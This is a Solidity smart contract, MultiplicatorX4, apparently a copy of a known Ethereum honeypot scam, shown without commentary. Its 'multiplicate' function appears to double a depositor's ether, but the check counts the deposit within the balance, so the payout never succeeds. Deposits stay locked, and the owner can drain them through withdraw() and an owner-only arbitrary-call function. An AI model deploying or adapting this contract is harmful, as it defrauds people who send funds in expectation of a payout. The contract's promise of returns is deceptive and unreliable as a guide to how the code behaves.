// SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.0;

contract MultiplicatorX4
{
    address public Owner = msg.sender;

    receive() external payable {}

    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        payable(Owner).transfer(address(this).balance);
    }

    function Command(address adr,bytes memory data)
    payable
    public
    {
        require(msg.sender == Owner);

        adr.call{value: msg.value}(data);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=address(this).balance)
        {
            payable(adr).transfer(address(this).balance+msg.value);
        }
    }
}
